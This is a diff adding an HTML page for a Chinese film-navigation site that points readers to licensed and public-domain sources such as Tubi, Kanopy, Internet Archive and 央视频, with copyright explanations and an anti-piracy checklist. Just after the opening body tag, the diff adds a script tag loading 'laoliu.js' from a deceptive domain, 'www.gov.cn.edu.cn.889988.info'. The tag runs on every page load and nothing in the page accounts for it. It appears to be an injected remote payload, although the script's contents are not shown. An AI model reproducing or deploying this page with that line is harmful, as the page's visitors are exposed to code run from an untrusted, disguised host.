@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>在线影视 - 正版影视导航·公共领域老片·电波频段按类型找片</title>
+<meta name="description" content="在线影视(zaixianyingshi-h5.github.io)用电波信号与频段网格做正版影视导航：新片正版窗口、老片公共领域、亲子官方免费、纪录资料馆。Tubi、Pluto、Plex、Kanopy、Hoopla、Internet Archive、Library of Congress、1905、央视频、学习强国、B站官方按授权类型分仓。不托管视频、不解析未授权源、不诱导下载播放器。">
+<meta name="keywords" content="在线影视, zaixianyingshi-h5, 正版影视导航, 公共领域老片, 按类型找电影, Tubi, Pluto, Kanopy, Internet Archive, 1905, 央视频">
+<meta name="author" content="在线影视">
+<meta name="robots" content="index, follow">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg:#050a14;--bg2:#0a1224;--ink:#e6f1ff;--ink2:#8ea8cc;
+  --wave:#00e5ff;--wave-light:#7afaff;--wave-deep:#00a8cc;
+  --band:#b347ff;--band-light:#d28fff;--band-deep:#7a2db5;
+  --signal:#00ffaa;--line:rgba(0,229,255,.22);
+  --radius:14px;--shadow:0 18px 44px rgba(0,0,0,.5);
+}
+html{scroll-behavior:smooth}
+body{font-family:"Noto Sans SC","PingFang SC","Microsoft YaHei",system-ui,sans-serif;background:var(--bg);color:var(--ink);line-height:1.85;overflow-x:hidden;font-size:16px}
+
+/* 电波背景 */
+.wave-bg{position:fixed;inset:0;z-index:0;pointer-events:none;
+ background:
+  radial-gradient(820px 520px at 84% 6%,rgba(0,229,255,.14),transparent 60%),
+  radial-gradient(700px 460px at 10% 96%,rgba(179,71,255,.12),transparent 60%),
+  linear-gradient(180deg,#050a14,#0a1224 56%,#03070f 100%);}
+.grid-line{position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.08;
+ background-image:linear-gradient(90deg,var(--wave) 1px,transparent 1px),linear-gradient(0deg,var(--wave) 1px,transparent 1px);
+ background-size:50px 50px}
+
+.topbar{position:fixed;top:0;left:0;right:0;z-index:1000;background:rgba(5,10,20,.95);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+.topbar-inner{max-width:1200px;margin:0 auto;padding:0 20px;height:64px;display:flex;align-items:center;justify-content:space-between}
+.brand{display:flex;align-items:center;gap:12px;font-weight:900;font-size:1.18rem}
+.brand .antenna{width:36px;height:36px;position:relative;display:flex;align-items:center;justify-content:center}
+.brand .antenna::before{content:"";width:4px;height:28px;background:linear-gradient(180deg,var(--wave),var(--band));border-radius:2px;position:absolute}
+.brand .antenna::after{content:"";position:absolute;top:-4px;width:14px;height:14px;border-radius:50%;background:var(--signal);box-shadow:0 0 12px var(--signal)}
+.brand b{color:var(--wave-light)}
+.topnav{display:flex;gap:6px}
+.topnav a{min-height:44px;display:inline-flex;align-items:center;padding:0 14px;border-radius:10px;font-size:.84rem;font-weight:600;color:var(--ink2);text-decoration:none;transition:.25s}
+.topnav a:hover,.topnav a.active{background:rgba(0,229,255,.14);color:var(--wave-light)}
+.menu-btn{display:none;background:none;border:none;font-size:1.5rem;color:var(--wave);cursor:pointer;min-width:44px;min-height:44px}
+
+/* Hero 信号发射 */
+.hero{position:relative;z-index:1;margin-top:64px;padding:70px 20px 54px}
+.hero-inner{max-width:1200px;margin:0 auto;display:grid;grid-template-columns:1.05fr .95fr;gap:40px;align-items:center}
+.kicker{font-family:"Courier New",monospace;font-size:.68rem;letter-spacing:3px;text-transform:uppercase;color:var(--wave);border:1px solid var(--line);padding:5px 14px;border-radius:20px;display:inline-block}
+.hero h1{font-size:clamp(2rem,4.6vw,3.1rem);font-weight:900;line-height:1.18;margin:16px 0 10px}
+.hero h1 .g{color:var(--wave-light)}.hero h1 .s{color:var(--band-light)}
+.hero p{color:var(--ink2);font-size:1rem;margin:14px 0 22px;max-width:560px}
+.hero-actions{display:flex;gap:14px;flex-wrap:wrap}
+.btn{font-family:inherit;font-weight:700;font-size:.9rem;min-height:44px;display:inline-flex;align-items:center;padding:0 24px;border-radius:10px;cursor:pointer;border:none;transition:.3s;text-decoration:none}
+.btn-wave{background:linear-gradient(135deg,var(--wave-light),var(--wave-deep));color:#030e1a}
+.btn-wave:hover{transform:translateY(-2px);box-shadow:0 14px 30px rgba(0,229,255,.30)}
+.btn-band{background:transparent;border:2px solid var(--band);color:var(--band-light)}
+.btn-band:hover{background:rgba(179,71,255,.12)}
+
+/* 信号筛选卡 */
+.signal-card{background:linear-gradient(160deg,var(--bg2),#0d1830);border:1px solid var(--line);border-radius:22px;padding:26px;box-shadow:var(--shadow);position:relative;overflow:hidden}
+.signal-card::before{content:"";position:absolute;top:-50px;right:-30px;width:200px;height:200px;border-radius:50%;background:radial-gradient(circle,rgba(0,229,255,.20),transparent 70%)}
+.signal-card h3{position:relative;font-size:.92rem;color:var(--wave);margin-bottom:14px;font-family:"Courier New",monospace}
+.bars{position:relative;display:grid;gap:12px}
+.bar{display:flex;gap:12px;align-items:flex-start;background:#081220;border:1px solid var(--line);border-radius:12px;padding:14px}
+.bar .freq{width:42px;height:34px;flex:0 0 42px;border-radius:6px;background:linear-gradient(135deg,var(--band),var(--band-deep));color:#fff;font-family:"Courier New",monospace;font-weight:900;font-size:.78rem;display:flex;align-items:center;justify-content:center}
+.bar h4{font-size:.9rem;color:var(--ink)}.bar p{font-size:.74rem;color:var(--ink2);line-height:1.55;margin-top:2px}
+
+.container{max-width:1200px;margin:0 auto;padding:52px 20px;position:relative;z-index:1}
+.head{margin-bottom:28px}
+.head .num{font-family:"Courier New",monospace;font-size:.72rem;letter-spacing:2px;color:var(--wave)}
+.head h2{font-size:clamp(1.3rem,3vw,1.9rem);font-weight:800;margin:4px 0 6px}
+.head p{font-size:.88rem;color:var(--ink2);max-width:720px}
+.rule{background:var(--bg2);border:1px solid var(--line);border-left:6px solid var(--wave);border-radius:var(--radius);padding:24px;margin-bottom:34px;box-shadow:var(--shadow)}
+.rule h3{font-size:1rem;color:var(--wave);margin-bottom:8px}
+.rule p{font-size:.84rem;color:var(--ink2);line-height:1.75}
+.rule ul{margin:8px 0 0 18px;font-size:.82rem;color:var(--ink2)}.rule li{margin:4px 0}
+
+/* 频段分类 */
+.bands{display:grid;grid-template-columns:repeat(auto-fill,minmax(270px,1fr));gap:18px}
+.bcard{background:var(--bg2);border:1px solid var(--line);border-radius:var(--radius);padding:22px;position:relative;transition:.3s}
+.bcard:hover{transform:translateY(-4px);box-shadow:var(--shadow);border-color:var(--wave)}
+.bcard .freq-tag{font-family:"Courier New",monospace;font-size:.68rem;font-weight:700;color:var(--wave);background:rgba(0,229,255,.08);padding:3px 9px;border-radius:6px;display:inline-block;margin-bottom:8px}
+.bcard h3{font-size:1rem;font-weight:800;margin-bottom:6px}
+.bcard p{font-size:.78rem;color:var(--ink2);line-height:1.65}
+.bcard .go{margin-top:10px;font-size:.72rem;font-weight:700;color:var(--band-light)}
+
+/* 波形时间线 */
+.wave-time{position:relative;padding-left:30px}
+.wave-time::before{content:"";position:absolute;left:10px;top:0;bottom:0;width:2px;background:linear-gradient(to bottom,var(--wave),var(--band))}
+.wtime{position:relative;margin-bottom:26px;background:var(--bg2);border:1px solid var(--line);border-radius:var(--radius);padding:20px;transition:.3s}
+.wtime:hover{transform:translateX(6px);border-color:var(--wave)}
+.wtime::before{content:"";position:absolute;left:-25px;top:22px;width:12px;height:12px;border-radius:50%;background:var(--signal);border:3px solid var(--bg);box-shadow:0 0 0 3px rgba(0,255,170,.18)}
+.wtime h3{font-size:.98rem;font-weight:800;margin-bottom:6px}
+.wtime p{font-size:.8rem;color:var(--ink2);line-height:1.7}
+.wtime .hz{font-family:"Courier New",monospace;font-size:.7rem;color:var(--wave)}
+
+/* 信号塔渠道 */
+.ch-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(258px,1fr));gap:18px}
+.ch{background:var(--bg2);border:1px solid var(--line);border-radius:var(--radius);padding:20px;transition:.3s;border-top:4px solid var(--wave)}
+.ch:nth-child(2){border-top-color:var(--band)}
+.ch:nth-child(3){border-top-color:var(--signal)}
+.ch:nth-child(4){border-top-color:#ff6b81}
+.ch:nth-child(5){border-top-color:var(--wave-light)}
+.ch:nth-child(6){border-top-color:var(--band-light)}
+.ch:nth-child(7){border-top-color:var(--signal)}
+.ch:nth-child(8){border-top-color:#ff6b81}
+.ch:hover{transform:translateY(-3px);border-color:var(--wave)}
+.ch .tag{font-family:"Courier New",monospace;font-size:.68rem;font-weight:700;color:var(--wave)}
+.ch h3{font-size:.98rem;font-weight:800;margin:6px 0 4px}
+.ch p{font-size:.76rem;color:var(--ink2);line-height:1.6}
+.ch .mode{margin-top:8px;font-size:.7rem;color:var(--band-light)}
+
+/* FAQ */
+.faq{display:grid;gap:12px}
+.qa{background:var(--bg2);border:1px solid var(--line);border-radius:14px;padding:18px 20px}
+.qa .q{font-weight:800;color:var(--wave);font-size:.92rem;margin-bottom:6px}
+.qa .a{font-size:.8rem;color:var(--ink2);line-height:1.75}.qa .a b{color:#fff}
+
+/* 红灯 */
+.safe{background:var(--bg2);border:1px solid var(--line);border-radius:var(--radius);padding:26px;box-shadow:var(--shadow)}
+.safe-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:12px;margin-top:14px}
+.safe-item{display:flex;gap:10px;font-size:.8rem;color:var(--ink2)}
+.safe-item .x{color:#ff6b81;font-weight:800}.safe-item .v{color:#37c98b;font-weight:800}
+
+.footer{position:relative;z-index:1;background:#03070f;color:var(--ink2);padding:48px 20px 24px;margin-top:54px;border-top:1px solid var(--line)}
+.footer-inner{max-width:1200px;margin:0 auto}
+.footer-grid{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:34px;margin-bottom:26px}
+.footer h4{font-size:.9rem;margin-bottom:10px;color:#fff}
+.footer a{display:block;font-size:.8rem;color:#6d88ab;padding:4px 0;text-decoration:none}
+.footer a:hover{color:var(--wave)}
+.footer p{font-size:.82rem;color:#6d88ab;line-height:1.6}
+.footer-bottom{text-align:center;font-size:.72rem;color:rgba(142,168,204,.5);padding-top:18px;border-top:1px solid rgba(0,229,255,.12)}
+.footer-bottom a{color:var(--wave);font-weight:600}
+
+@media(max-width:1024px){.hero-inner{grid-template-columns:1fr}.signal-card{order:-1}}
+@media(max-width:768px){
+ .topnav{display:none;position:absolute;top:64px;left:0;right:0;flex-direction:column;background:#050a14;padding:12px 20px;border-bottom:1px solid var(--line)}
+ .topnav.open{display:flex}.menu-btn{display:block}
+ .footer-grid{grid-template-columns:1fr 1fr}.bands,.ch-grid{grid-template-columns:1fr}
+}
+@media(max-width:480px){.footer-grid{grid-template-columns:1fr}.hero h1{font-size:1.7rem}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+<div class="wave-bg"></div><div class="grid-line"></div>
+
+<div class="topbar"><div class="topbar-inner">
+ <div class="brand"><span class="antenna"></span>在线<b>影视</b></div>
+ <nav class="topnav" id="topNav">
+  <a href="#home" class="active">首页</a>
+  <a href="#rule">正版立场</a>
+  <a href="#bands">频段分类</a>
+  <a href="#waves">公共领域</a>
+  <a href="#channels">授权渠道</a>
+  <a href="#faq">常见问题</a>
+  <a href="#safe">避坑合规</a>
+ </nav>
+ <button class="menu-btn" id="menuBtn">☰</button>
+</div></div>
+
+<section class="hero" id="home"><div class="hero-inner">
+ <div>
+  <span class="kicker">SIGNAL FINDER · NEW/OLD/GENRE/LIBRARY/PUBLIC DOMAIN</span>
+  <h1>在线影视，<span class="g">电波信号</span><br>走<span class="s">正版频段</span>不迷路。</h1>
+  <p>在线影视（zaixianyingshi-h5.github.io）用电波发射+频段网格做正版找片：新片查正版窗口、老片查公共领域、亲子查官方免费、纪录查资料馆与图书馆。Tubi、Pluto、Plex、Kanopy、Hoopla、Internet Archive、Library of Congress、1905、央视频、学习强国、B站官方按授权类型分仓；不托管视频、不解析未授权源、不诱导下载播放器。</p>
+  <div class="hero-actions">
+   <a class="btn btn-wave" href="#bands">📡 进频段找片</a>
+   <a class="btn btn-band" href="#waves">🎞 查公共领域老片</a>
+  </div>
+ </div>
+ <div class="signal-card"><h3>SIGNAL FILTER · 4 STEPS</h3>
+  <div class="bars">
+   <div class="bar"><div class="freq">FM1</div><div><h4>定需求频</h4><p>片名/类型/新片或老片/地区/是否亲子；不写"高清全集免费"等盗版词。</p></div></div>
+   <div class="bar"><div class="freq">FM2</div><div><h4>选授权层</h4><p>新片正版VOD/广告免费，老片公域/资料馆，文艺图书馆，国内官方免费层。</p></div></div>
+   <div class="bar"><div class="freq">FM3</div><div><h4>查渠道频</h4><p>Tubi/Pluto/Plex、Kanopy/Hoopla、Archive/LOC、1905/央视频/学习强国/B站官方。</p></div></div>
+   <div class="bar"><div class="freq">FM4</div><div><h4>排雷频</h4><p>无EXE/无种子/无假播放键/无强制验证码；公域片逐条看权利页。</p></div></div>
+  </div>
+ </div>
+</div></section>
+
+<div class="container" id="rule"><div class="rule">
+ <h3>为什么在线影视只做"信号导航"不播片</h3>
+ <p>免费≠无授权。合法免费通常来自四类：广告型正版平台、图书馆/高校采购、公共领域档案、官方机构发布。Tubi/Pluto/Plex 基础内容多可免登录但片单随授权轮换； Kanopy 经公共图书馆或高校提供无广告电影，偏独立/Criterion/纪录； Hoopla 靠图书馆卡借电影/有声/电子书，按月额度、无广告； Internet Archive 与 Library of Congress 公域片无广告，但某版本修复/字幕/配乐可能另有权； 1905/央视频/学习强国/B站机构号按当期正版或官方免费层查。本站只按需求给"去哪查、按什么授权、地区是否可用"，不提供未授权点播、不解析第三方源。</p>
+ <ul>
+  <li>广告正版：Tubi 大体量点播、Pluto 线性频道+点播、Plex 免费层+FAST直播，用广告换免费，片单随市场轮换</li>
+  <li>图书馆：Kanopy 偏独立/Criterion/纪录，Hoopla 借电影/有声/电子书，靠读者卡或高校账号、按月额度、无广告</li>
+  <li>公域档案：Internet Archive 默片/早期/新闻/教育，LOC National Screening Room 早期影片；单部看权利页，不默认"在档案站=可转"</li>
+  <li>国内官方：1905 国产老片与经典译制、央视频纪录与经典、学习强国零广告影视教育、B站筛机构认证号</li>
+ </ul>
+</div></div>
+
+<div class="container" id="bands"><div class="head">
+ <div class="num">— FREQUENCY BANDS —</div>
+ <h2>频段分类：按"新/老/类型/人群"四波段找片</h2>
+ <p>同需求可走多波段；具体可看片目随平台版权与地区变化，以各平台当期授权为准。</p>
+</div>
+<div class="bands">
+ <div class="bcard"><span class="freq-tag">NEW · 新片频</span><h3>院线/近三年新作</h3><p>先查正版订阅/租赁窗口，再查 Tubi/Pluto/Plex 广告免费层；凡"院线高清全集免费"无授权主体按盗版风险处理、不列不点。</p><div class="go">去：正版VOD / Tubi / Pluto / Plex</div></div>
+ <div class="bcard"><span class="freq-tag">OLD · 老片频</span><h3>默片/早期/经典老电影</h3><p>美国1923及更早作品通常更易公域，但单部仍看续展/修复/配乐；非公域老片走 1905/央视频/正版资料馆。</p><div class="go">去：Internet Archive / LOC / 1905 / 资料馆</div></div>
+ <div class="bcard"><span class="freq-tag">GENRE · 类型频</span><h3>动作/喜剧/恐怖/纪录/动画</h3><p>商业新类型走广告正版，恐怖走 Pluto/Tubi，纪录走 Kanopy/央视频，动画亲子走官方与 Tubi Kids。</p><div class="go">去：Tubi / Pluto / Kanopy / 央视频</div></div>
+ <div class="bcard"><span class="freq-tag">PEOPLE · 人群频</span><h3>亲子/学生/银发/合家欢</h3><p>亲子用央视频少儿/学习强国/B站机构/Tubi Kids；学生用 Kanopy/Hoopla 本馆资格；银发用 1905 经典与公域老片。</p><div class="go">去：央视频 / 学习强国 / Kanopy / Hoopla</div></div>
+</div></div>
+
+<div class="container" id="waves"><div class="head">
+ <div class="num">— PUBLIC DOMAIN WAVES —</div>
+ <h2>公共领域老片：在线影视的"免费底库"说明</h2>
+ <p>"老"不等于"随便转"。美国按出版年份与续展判断：1923及更早通常公域，1928—1963未续展可能公域，1964后多按95年保护，政府作品、配乐、底本、修复版要分层核。</p>
+</div>
+<div class="wave-time">
+ <div class="wtime"><span class="hz">≤1923 / 多数早期</span><h3>默片与最早有声</h3><p>卓别林、基顿等默片喜剧，早期新闻/短剧在 Archive/LOC 可查公域版本；后加配乐、重制字幕可能产生新权利。</p></div>
+ <div class="wtime"><span class="hz">1928-1963</span><h3>未续展与部分老片</h3><p>该区间需查版权续展；未续展常可公域，已续展仍受保护。LOC 对1930年1月1日前影片可按公域复制，之后须查权属与捐赠限制。</p></div>
+ <div class="wtime"><span class="hz">RESCAN</span><h3>修复与重剪版</h3><p>重剪、调色、新字幕、新配乐会产生新权利；教学引用原片公域版最稳，修复版先核资料馆授权。</p></div>
+ <div class="wtime"><span class="hz">GOV/TOOL</span><h3>政府片与公域发现器</h3><p>美国联邦政府影像通常无版权；用 Archive/LOC 直接检索，或 Open Culture/WikiFlix 类只做导览；不中转录播、不打包下载。</p></div>
+</div></div>
+
+<div class="container" id="channels"><div class="head">
+ <div class="num">— LICENSED CHANNELS —</div>
+ <h2>信号塔授权渠道：按商业模式分仓</h2>
+ <p>地区版权会变；图书馆看本馆采购，公域片逐条看权利说明。</p>
+</div>
+<div class="ch-grid">
+ <div class="ch"><div class="tag">AD VOD</div><h3>Tubi</h3><p>广告型正版大库，动作/喜剧/恐怖/老爆款较全；基础观看可免登录，片单随授权轮换。</p><div class="mode">模式：授权+广告</div></div>
+ <div class="ch"><div class="tag">FAST LINEAR</div><h3>Pluto TV</h3><p>250+线性电影频道+点播，换台式找片省决策；经典线/家庭线/恐怖线多，基础内容可免登录。</p><div class="mode">模式：授权+广告</div></div>
+ <div class="ch"><div class="tag">HYBRID</div><h3>Plex 免费层</h3><p>个人媒体服务器起家，免费层含授权电影/剧集/FAST直播；不搭服务器也能用发现功能。</p><div class="mode">模式：授权+广告</div></div>
+ <div class="ch"><div class="tag">LIBRARY</div><h3>Kanopy / Hoopla</h3><p>Kanopy 偏独立/Criterion/纪录、无广告；Hoopla 借电影/有声/电子书，靠读者卡或高校账号、按月额度。</p><div class="mode">模式：机构采购</div></div>
+ <div class="ch"><div class="tag">PUBLIC DOMAIN</div><h3>Internet Archive</h3><p>公共领域长片、默片、新闻片、教育片档案；无广告无账号，但某版本修复/字幕/配乐可能另有权利。</p><div class="mode">模式：公域/许可</div></div>
+ <div class="ch"><div class="tag">ARCHIVE GOV</div><h3>Library of Congress</h3><p>National Screening Room 提供大量早期影片；1930年前影片可复制但受捐赠/权属限制，单部仍查编目权利。</p><div class="mode">模式：公域/政府档案</div></div>
+ <div class="ch"><div class="tag">CN OFFICIAL</div><h3>1905 / 央视频</h3><p>1905 正版老片与经典译制较全，央视频经典电影/纪录片/老剧稳定、公益属性强、广告少；以站内当期正版/免费层为准。</p><div class="mode">模式：官方正版/免费层</div></div>
+ <div class="ch"><div class="tag">EDU + BILI</div><h3>学习强国 / B站</h3><p>学习强国影视纪录零广告；B站筛机构认证号看戏曲/纪录/文艺，不点个人"全集解析"搬运。</p><div class="mode">模式：官方/授权上传</div></div>
+</div></div>
+
+<div class="container" id="faq"><div class="head">
+ <div class="num">— FAQ —</div>
+ <h2>在线影视常见问题（正版找片版）</h2>
+ <p>FAQ 用初始HTML文本呈现，便于必应摘取富摘要、移动端直接读。</p>
+</div>
+<div class="faq">
+ <div class="qa"><div class="q">在线影视能直接看电影吗？</div><div class="a">不能也不做。本站只给正版/公域/官方渠道路径；实际播放在 <b>Tubi、Pluto、Plex、Kanopy、Hoopla、Internet Archive、LOC、1905、央视频、学习强国、B站官方</b> 等平台，片单随授权与地区变化。</div></div>
+ <div class="qa"><div class="q">老电影都算公共领域免费吗？</div><div class="a">不算。美国1923及更早通常公域，1928—1963看续展，1964后多按95年保护；修复、字幕、配乐、底本可能另有权。非公域老片走正版资料馆或官方免费层，单部以权利页为准。</div></div>
+ <div class="qa"><div class="q">没有会员怎么找免费正版？</div><div class="a">用 <b>Tubi/Pluto/Plex</b> 基础层、<b>Internet Archive/LOC</b> 公域、<b>1905/央视频</b> 部分免费；有读者卡/校卡再加 <b>Kanopy/Hoopla</b>。</div></div>
+ <div class="qa"><div class="q">亲子片哪个频最稳？</div><div class="a">国内用央视频少儿/学习强国/B站机构号，海外用 Tubi Kids/Pluto 儿童线/Kanopy Kids（若本馆开通）；不点"全网VIP免费"第三方。</div></div>
+ <div class="qa"><div class="q">为什么有些免费站不能去？</div><div class="a">院线新片"高清全集免费"、要验证码/种子/EXE、假播放键、强制扩展的站点风险高；正版免费站会写明授权主体、广告或图书馆/公域来源。</div></div>
+</div></div>
+
+<div class="container" id="safe"><div class="head">
+ <div class="num">— ANTI-PIRACY —</div>
+ <h2>在线影视红灯清单</h2>
+ <p>合法免费站通常说明授权主体、广告模式或图书馆/公域来源；可疑站用假播放键和强制下载。</p>
+</div>
+<div class="safe"><div class="safe-grid">
+ <div class="safe-item"><span class="x">✕</span> 院线新片"高清全集免费"、要验证码/网盘密码/种子/磁力</div>
+ <div class="safe-item"><span class="x">✕</span> 点播放先下EXE/专用播放器/解码插件/浏览器扩展</div>
+ <div class="safe-item"><span class="x">✕</span> 深度解析第三方视频源、无主体无授权无投诉入口</div>
+ <div class="safe-item"><span class="x">✕</span> 弹窗满屏、假病毒提醒、赌博/成人重定向、域名天天换</div>
+ <div class="safe-item"><span class="x">✕</span> 用"最全/破解/资源站/秒播"做主卖点、盗海报仿官方</div>
+ <div class="safe-item"><span class="x">✕</span> 老片不分原片公域与修复授权，一律写"免费可下可转"</div>
+ <div class="safe-item"><span class="v">✓</span> 标明渠道类型：广告/订阅/官方/图书馆/公域/资料馆</div>
+ <div class="safe-item"><span class="v">✓</span> 不存片、不解析、不诱导下载任何软件</div>
+ <div class="safe-item"><span class="v">✓</span> 片单写"以平台当期授权、地区与账号资格为准"</div>
+ <div class="safe-item"><span class="v">✓</span> 页脚有主体、隐私、版权投诉与联系入口</div>
+ <div class="safe-item"><span class="v">✓</span> 移动端无全屏强制弹层、锚点可点、核心内容在初始HTML</div>
+ <div class="safe-item"><span class="v">✓</span> 公域片区分原片公域与修复/字幕/配乐另行授权</div>
+</div></div></div>
+
+<footer class="footer"><div class="footer-inner">
+ <div class="footer-grid">
+  <div><div class="brand"><span class="antenna"></span>在线<b>影视</b></div>
+   <p style="margin-top:10px">在线影视（zaixianyingshi-h5.github.io）是电波信号式正版找片导航：Tubi、Pluto、Plex、Kanopy、Hoopla、Internet Archive、Library of Congress、1905、央视频、学习强国、B站官方等正版/公共领域渠道。不提供未授权播放，不解析非法视听源，不诱导下载任何播放器；静态HTML、内联样式、移动自适应，便于必应抓取。按规则不生成 robots.txt/sitemap.xml，上线后可在 Bing Webmaster Tools 手动提交 URL 加速发现。</p></div>
+  <div><h4>栏目</h4><a href="#rule">正版立场</a><a href="#bands">频段分类</a><a href="#waves">公共领域</a><a href="#channels">授权渠道</a><a href="#faq">常见问题</a></div>
+  <div><h4>渠道</h4><a href="#">广告正版</a><a href="#">图书馆流</a><a href="#">公域档案</a><a href="#">国内官方</a></div>
+  <div><h4>说明</h4><a href="#">版权投诉</a><a href="#">隐私说明</a><a href="#">使用条款</a><a href="#">联系我们</a></div>
+ </div>
+ <div class="footer-bottom">
+  <p>© 2026 在线影视 (ZaiXian YingShi) - 电波信号·正版影视导航·公共领域老片·按类型渠道分仓</p>
+  <p>网站地址：<a href="https://zaixianyingshi-h5.github.io">https://zaixianyingshi-h5.github.io</a></p>
+  <p style="margin-top:6px;opacity:.6">"在线影视"仅指正版/公共领域/官方机构导航服务，不涉及盗版全集、资源解析或未授权点播。</p>
+ </div>
+</div></footer>
+
+<script>
+var menuBtn=document.getElementById('menuBtn'),topNav=document.getElementById('topNav');
+menuBtn.onclick=function(){topNav.classList.toggle('open')};
+topNav.querySelectorAll('a').forEach(function(a){a.onclick=function(){topNav.classList.remove('open')}});
+var secs=document.querySelectorAll('section[id],div[id]');
+addEventListener('scroll',function(){
+ var y=scrollY+82;
+ secs.forEach(function(s){
+  if(y>=s.offsetTop&&y<s.offsetTop+s.offsetHeight){
+   document.querySelectorAll('.topnav a').forEach(function(a){a.classList.remove('active')});
+   var l=document.querySelector('.topnav a[href="#'+s.id+'"]');if(l)l.classList.add('active');
+  }
+ });
+});
+</script>
+</body>
+</html>
